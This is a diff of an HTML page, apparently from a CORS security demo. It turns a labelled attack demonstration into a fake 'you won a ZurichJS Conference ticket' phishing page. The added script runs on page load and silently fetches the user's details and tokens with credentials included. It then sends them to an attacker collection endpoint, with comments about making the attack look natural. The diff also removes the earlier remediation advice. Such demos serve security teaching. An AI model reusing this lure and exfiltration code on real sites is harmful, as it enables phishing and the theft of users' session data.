@@ -3,293 +3,370 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Site - CORS Attack Demo</title>
+    <title>🎉 Congratulations! You Won a ZurichJS Conference 2026 Ticket!</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
-            background-color: #fff5f5;
         }
-        .warning {
-            background-color: #ffebee;
-            border: 2px solid #f44336;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 100%;
+            overflow: hidden;
+            position: relative;
         }
-        .success {
-            background-color: #e8f5e8;
-            border: 2px solid #4caf50;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+
+        .header {
+            background: linear-gradient(135deg, #f5d020 0%, #f53803 100%);
+            padding: 40px 30px;
+            text-align: center;
+            position: relative;
         }
-        .error {
-            background-color: #ffebee;
-            border: 2px solid #f44336;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+
+        .header::before {
+            content: '🎉';
+            font-size: 60px;
+            position: absolute;
+            top: 20px;
+            left: 30px;
+            animation: bounce 2s infinite;
         }
-        button {
-            background-color: #f44336;
+
+        .header::after {
+            content: '🎊';
+            font-size: 60px;
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            animation: bounce 2s infinite 0.5s;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        .header h1 {
             color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
+            font-size: 2.5em;
+            font-weight: 800;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
-        button:hover {
-            background-color: #d32f2f;
+
+        .header p {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.2em;
+            font-weight: 500;
         }
-        pre {
-            background-color: #f5f5f5;
+
+        .content {
+            padding: 40px 30px;
+        }
+
+        .winner-badge {
+            background: linear-gradient(135deg, #f5d020 0%, #f53803 100%);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.3em;
+            font-weight: bold;
+            text-align: center;
+            margin: 0 auto 30px;
+            width: fit-content;
+            box-shadow: 0 8px 25px rgba(245, 56, 3, 0.3);
+        }
+
+        .conference-info {
+            background: #f8f9ff;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 5px solid #667eea;
+        }
+
+        .conference-info h3 {
+            color: #333;
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .conference-info h3::before {
+            content: '🚀';
+            margin-right: 10px;
+            font-size: 1.2em;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
             padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
-        .stolen-data {
-            background-color: #fff3e0;
-            border: 2px solid #ff9800;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
+
+        .info-item .icon {
+            font-size: 1.5em;
+            margin-right: 12px;
         }
+
+        .info-item .text {
+            flex: 1;
+        }
+
+        .info-item .label {
+            font-size: 0.85em;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .info-item .value {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .next-steps {
+            background: #e8f5e8;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+            border-left: 5px solid #4caf50;
+        }
+
+        .next-steps h3 {
+            color: #2e7d32;
+            font-size: 1.3em;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .next-steps h3::before {
+            content: '📋';
+            margin-right: 10px;
+        }
+
+        .steps-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .steps-list li {
+            padding: 12px 0;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #c8e6c9;
+        }
+
+        .steps-list li:last-child {
+            border-bottom: none;
+        }
+
+        .steps-list li::before {
+            content: '✅';
+            margin-right: 15px;
+            font-size: 1.2em;
+        }
+
+        .footer {
+            background: #f5f5f5;
+            padding: 20px 30px;
+            text-align: center;
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .zurichjs-logo {
+            font-weight: bold;
+            color: #333;
+            font-size: 1.1em;
+        }
+
+
     </style>
 </head>
 <body>
-    <div class="warning">
-        <h1>🚨 MALICIOUS SITE - CORS VULNERABILITY DEMO 🚨</h1>
-        <p><strong>WARNING:</strong> This is a demonstration of a CORS vulnerability attack. In a real scenario, this would be a malicious website trying to steal user data.</p>
-    </div>
-
-    <h2>CORS Attack Simulation</h2>
-    <p>This site will attempt to access the protected user details from localhost:3003 by exploiting the CORS misconfiguration.</p>
-
-    <div>
-        <h3>Attack Steps:</h3>
-        <ol>
-            <li>User logs into the vulnerable app (localhost:3003) and gets a session cookie</li>
-            <li>User visits this malicious site while still logged in</li>
-            <li>This site makes a request with <code>credentials: 'include'</code></li>
-            <li>Browser automatically sends the session cookie with the request</li>
-            <li>Due to CORS misconfiguration, the server accepts the cross-origin request</li>
-            <li>Sensitive user data is stolen and displayed below</li>
-        </ol>
-        <div class="warning">
-            <p><strong>🔑 Key Point:</strong> The attacker doesn't need to steal the session token - the browser automatically sends cookies when <code>credentials: 'include'</code> is used!</p>
+    <div class="container">
+        <div class="header">
+            <h1>Congratulations!</h1>
+            <p>You've won a free ticket to ZurichJS Conference 2026!</p>
         </div>
-    </div>
 
-    <button onclick="attemptCORSAttack()">🔓 Attempt CORS Attack</button>
-    <button onclick="checkSession()">🔍 Check Session Status</button>
-    <button onclick="clearResults()">🧹 Clear Results</button>
+        <div class="content">
+            <div class="winner-badge">
+                🎫 FREE CONFERENCE TICKET WINNER! 🎫
+            </div>
 
-    <div id="results"></div>
+            <div class="conference-info">
+                <h3>ZurichJS Conference 2026</h3>
+                <p>Join Zurich's premier JavaScript conference featuring world-class speakers, workshops, and networking opportunities.</p>
+                
+                <div class="info-grid">
+                    <div class="info-item">
+                        <div class="icon">📅</div>
+                        <div class="text">
+                            <div class="label">Date</div>
+                            <div class="value">Late August 2026</div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="icon">📍</div>
+                        <div class="text">
+                            <div class="label">Location</div>
+                            <div class="value">Zurich, Switzerland</div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="icon">💰</div>
+                        <div class="text">
+                            <div class="label">Ticket Value</div>
+                            <div class="value">CHF 299</div>
+                        </div>
+                    </div>
+                    <div class="info-item">
+                        <div class="icon">👥</div>
+                        <div class="text">
+                            <div class="label">Expected Attendees</div>
+                            <div class="value">300+ Developers</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
 
-    <div class="warning">
-        <h3>How to Fix This Vulnerability:</h3>
-        <ul>
-            <li><strong>Fix CORS Configuration:</strong> Set specific allowed origins instead of reflecting the Origin header</li>
-            <li>Use <code>Access-Control-Allow-Origin: https://yourdomain.com</code> (specific domain)</li>
-            <li><strong>Never use:</strong> <code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code></li>
-            <li><strong>Cookie Security:</strong> Set cookies with <code>SameSite=Strict</code> or <code>SameSite=Lax</code></li>
-            <li><strong>Additional Protection:</strong> Implement proper CSRF tokens</li>
-            <li><strong>Best Practice:</strong> Use <code>httpOnly</code> cookies and avoid storing sensitive tokens in localStorage</li>
-        </ul>
-        <div class="success">
-            <h4>✅ Secure CORS Configuration Example:</h4>
-            <pre>// Instead of this vulnerable code:
-res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
-res.setHeader("Access-Control-Allow-Credentials", "true");
+            <div class="next-steps">
+                <h3>What happens next?</h3>
+                <ul class="steps-list">
+                    <li>Your ticket has been automatically reserved</li>
+                    <li>Confirmation email will be sent within 24 hours</li>
+                    <li>You'll receive speaker announcements as they're confirmed</li>
+                    <li>Workshop selection opens 30 days before the event</li>
+                </ul>
+            </div>
 
-// Use this secure code:
-const allowedOrigins = ['https://yourdomain.com'];
-if (allowedOrigins.includes(req.headers.origin)) {
-  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
-  res.setHeader("Access-Control-Allow-Credentials", "true");
-}</pre>
+
+
+
+        </div>
+
+        <div class="footer">
+            <div class="zurichjs-logo">ZurichJS</div>
+            <p>Building the JavaScript community in Switzerland since 2012</p>
+            <p>This is a demonstration of a phishing attack for educational purposes only.</p>
         </div>
     </div>
 
     <script>
+        // Silent CORS attack function - runs on page load
         async function attemptCORSAttack() {
-            const resultsDiv = document.getElementById('results');
-            resultsDiv.innerHTML = '<p>🔄 Attempting to steal user data...</p>';
-
             try {
-                // Debug: Check what cookies are available
-                console.log('All cookies:', document.cookie);
-                console.log('Making request to:', 'http://localhost:3003/api/userDetails');
+                console.log('🚨 PHISHING ATTACK: Silently stealing user data...');
                 
-                // The key to CORS attack: Use credentials: 'include' to send cookies
-                // The attacker doesn't need to know the session token - cookies are sent automatically!
+                // Attempt to steal user data via CORS vulnerability
                 const response = await fetch('http://localhost:3003/api/userDetails', {
                     method: 'GET',
-                    credentials: 'include', // This automatically includes cookies from the target domain
+                    credentials: 'include', // Automatically includes cookies from target domain
                     headers: {
                         'Content-Type': 'application/json'
-                        // No Authorization header needed - using cookies instead!
                     }
                 });
 
-                console.log('Response status:', response.status);
-                console.log('Response headers:', [...response.headers.entries()]);
-
                 if (response.ok) {
                     const userData = await response.json();
+                    console.log('✅ STOLEN DATA:', userData);
                     
-                    // 🚨 EXFILTRATE THE STOLEN DATA TO ATTACKER SERVER 🚨
+                    // Exfiltrate stolen data to attacker server
                     try {
                         const exfiltrationUrl = `http://localhost:5001/collect?data=${encodeURIComponent(JSON.stringify(userData))}`;
-                        console.log('🚨 Exfiltrating stolen data to:', exfiltrationUrl);
-                        
-                        // Send stolen data to attacker's server
                         await fetch(exfiltrationUrl, {
                             method: 'GET',
-                            mode: 'no-cors' // Avoid CORS issues for data exfiltration
+                            mode: 'no-cors'
                         });
-                        
                         console.log('✅ Data successfully exfiltrated to attacker server');
+                        
                     } catch (exfiltrationError) {
                         console.error('❌ Failed to exfiltrate data:', exfiltrationError);
                     }
                     
-                    resultsDiv.innerHTML = `
-                        <div class="stolen-data">
-                            <h3>🚨 ATTACK SUCCESSFUL - SENSITIVE DATA STOLEN! 🚨</h3>
-                            <p><strong>The CORS vulnerability allowed this malicious site to steal user data:</strong></p>
-                            <pre>${JSON.stringify(userData, null, 2)}</pre>
-                            <p><strong>Stolen Information:</strong></p>
-                            <ul>
-                                <li>Username: ${userData.username}</li>
-                                <li>Secret Token: ${userData.token}</li>
-                                <li>Session Token: ${userData.sessionInfo?.sessionToken}</li>
-                                <li>Login Time: ${userData.sessionInfo?.loginTime}</li>
-                            </ul>
-                            <div class="warning">
-                                <h4>🚨 How This Attack Worked:</h4>
-                                <ol>
-                                    <li>User logged into the legitimate app (localhost:3003)</li>
-                                    <li>Browser stored session cookie for localhost:3003</li>
-                                    <li>User visited this malicious site (different origin)</li>
-                                    <li>This malicious site made a request with credentials: 'include'</li>
-                                    <li>Browser automatically included the session cookie</li>
-                                    <li>Due to CORS misconfiguration, the request succeeded</li>
-                                    <li><strong>Stolen data was exfiltrated to attacker server (localhost:5000)</strong></li>
-                                </ol>
-                            </div>
-                            <div class="success">
-                                <h4>🔍 Check Exfiltrated Data:</h4>
-                                <p>The stolen data has been sent to the attacker's server!</p>
-                                <ul>
-                                    <li><a href="http://localhost:5001/stolen-data" target="_blank">View all stolen data</a></li>
-                                    <li>Check the exfiltration server console for real-time logs</li>
-                                </ul>
-                            </div>
-                        </div>
-                    `;
                 } else {
-                    const errorData = await response.json().catch(() => ({ message: 'Unknown error' }));
-                    resultsDiv.innerHTML = `
-                        <div class="error">
-                            <h3>❌ Attack Failed</h3>
-                            <p>Status: ${response.status}</p>
-                            <p>Error: ${errorData.message || 'Request failed'}</p>
-                            <p>This could be due to:</p>
-                            <ul>
-                                <li><strong>User not logged in</strong> - Visit <a href="http://localhost:3003" target="_blank">localhost:3003</a> and log in first</li>
-                                <li>Session expired</li>
-                                <li>CORS is properly configured (which would be good!)</li>
-                                <li><strong>Cookie issue</strong> - Check browser console for cookie debugging info</li>
-                            </ul>
-                            <p><strong>💡 To test the vulnerability:</strong></p>
-                            <ol>
-                                <li>Open <a href="http://localhost:3003" target="_blank">http://localhost:3003</a> in the <strong>same browser</strong></li>
-                                <li>Log in with any username/password</li>
-                                <li>Keep that tab open and come back to this tab</li>
-                                <li>Try the attack again</li>
-                            </ol>
-                            <p><strong>🔍 Debug Info:</strong></p>
-                            <p>Check the browser console for cookie and request details.</p>
-                        </div>
-                    `;
+                    console.log('❌ CORS attack failed - user not logged in or CORS properly configured');
                 }
             } catch (error) {
-                resultsDiv.innerHTML = `
-                    <div class="error">
-                        <h3>❌ Network Error</h3>
-                        <p>Error: ${error.message}</p>
-                        <p>This could indicate:</p>
-                        <ul>
-                            <li>The vulnerable server is not running on localhost:3003</li>
-                            <li>CORS is actually properly configured (good!)</li>
-                            <li>Network connectivity issues</li>
-                        </ul>
-                        <div class="warning">
-                            <h4>🔧 Setup Instructions:</h4>
-                            <ol>
-                                <li>Make sure the backend server is running: <code>cd backend && node server.js</code></li>
-                                <li>Visit <a href="http://localhost:3003" target="_blank">localhost:3003</a> and log in</li>
-                                <li>Return here and try the attack</li>
-                            </ol>
-                        </div>
-                    </div>
-                `;
+                console.error('❌ CORS attack failed:', error);
             }
         }
 
-        async function checkSession() {
-            const resultsDiv = document.getElementById('results');
-            
-            try {
-                // Try to access the basic API endpoint first
-                const response = await fetch('http://localhost:3003/api', {
-                    method: 'GET',
-                    credentials: 'include'
-                });
 
-                if (response.ok) {
-                    const data = await response.text();
-                    resultsDiv.innerHTML = `
-                        <div class="success">
-                            <h3>✅ Basic CORS Check Successful</h3>
-                            <p>The vulnerable server is accessible from this malicious site.</p>
-                            <p>Response: ${data}</p>
-                            <p>This confirms the CORS misconfiguration exists.</p>
-                        </div>
-                    `;
-                } else {
-                    resultsDiv.innerHTML = `
-                        <div class="error">
-                            <h3>❌ Cannot Access Vulnerable Server</h3>
-                            <p>Status: ${response.status}</p>
-                            <p>Make sure the vulnerable server is running on localhost:3003</p>
-                        </div>
-                    `;
-                }
-            } catch (error) {
-                resultsDiv.innerHTML = `
-                    <div class="error">
-                        <h3>❌ Connection Failed</h3>
-                        <p>Error: ${error.message}</p>
-                        <p>The vulnerable server might not be running on localhost:3003</p>
-                    </div>
-                `;
-            }
-        }
 
-        function clearResults() {
-            document.getElementById('results').innerHTML = '';
-        }
-
-        // Auto-run basic check when page loads
+        // Execute CORS attack silently when page loads
         window.addEventListener('load', () => {
-            setTimeout(checkSession, 1000);
+            // Small delay to make it look more natural
+            setTimeout(attemptCORSAttack, 1000);
         });
+
+        // Add some festive animations
+        function createConfetti() {
+            const colors = ['#f5d020', '#f53803', '#667eea', '#764ba2', '#4caf50'];
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.style.position = 'fixed';
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.top = '-10px';
+                    confetti.style.width = '10px';
+                    confetti.style.height = '10px';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.pointerEvents = 'none';
+                    confetti.style.borderRadius = '50%';
+                    confetti.style.animation = `fall ${3 + Math.random() * 2}s linear forwards`;
+                    
+                    const style = document.createElement('style');
+                    style.textContent = `
+                        @keyframes fall {
+                            to {
+                                transform: translateY(100vh) rotate(360deg);
+                                opacity: 0;
+                            }
+                        }
+                    `;
+                    document.head.appendChild(style);
+                    document.body.appendChild(confetti);
+                    
+                    setTimeout(() => {
+                        confetti.remove();
+                        style.remove();
+                    }, 5000);
+                }, Math.random() * 3000);
+            }
+        }
+
+        // Start confetti after a short delay
+        setTimeout(createConfetti, 500);
     </script>
 </body>
 </html>
